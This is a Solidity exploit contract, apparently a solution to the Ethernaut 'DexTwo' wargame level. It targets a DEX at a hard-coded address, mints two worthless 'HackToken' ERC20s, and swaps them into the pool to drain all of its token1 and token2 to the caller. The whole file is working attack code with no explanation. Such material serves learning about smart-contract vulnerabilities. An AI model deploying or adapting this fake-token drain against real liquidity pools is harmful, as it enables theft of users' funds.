// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function setTokens(address _token1, address _token2) external;

    function add_liquidity(address token_address, uint256 amount) external;

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function getSwapAmount(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);
}

interface SwappableTokenTwo is IERC20 {
    function approve(
        address owner,
        address spender,
        uint256 amount
    ) external;
}

contract HackToken is ERC20 {
    constructor(
        address hackContract,
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 amount
    ) ERC20(name, symbol) {
        _mint(hackContract, amount);
        _mint(dexInstance, amount);
        _approve(hackContract, dexInstance, amount);
    }
}

contract Hack {
    IDexTwo private immutable target =
        IDexTwo(0x10FDc3074120E1B98fe48139A65646384487C3d0);

    function attack() external {
        // use target.approve(address(this), 10) on the remix gui
        address token1 = target.token1();
        address token2 = target.token2();

        //new tokens
        address hackToken1 = address(
            new HackToken(
                address(this),
                address(target),
                "Hack Token One",
                "HTO",
                100
            )
        );
        address hackToken2 = address(
            new HackToken(
                address(this),
                address(target),
                "Hack Token Two",
                "HTT",
                100
            )
        );

        target.swap(hackToken1, token1, 100);
        target.swap(hackToken2, token2, 100);

        target.approve(address(this), 1000);
        IERC20(token1).transferFrom(
            address(this),
            msg.sender,
            target.balanceOf(token1, address(this))
        );
        IERC20(token2).transferFrom(
            address(this),
            msg.sender,
            target.balanceOf(token2, address(this))
        );
    }
}
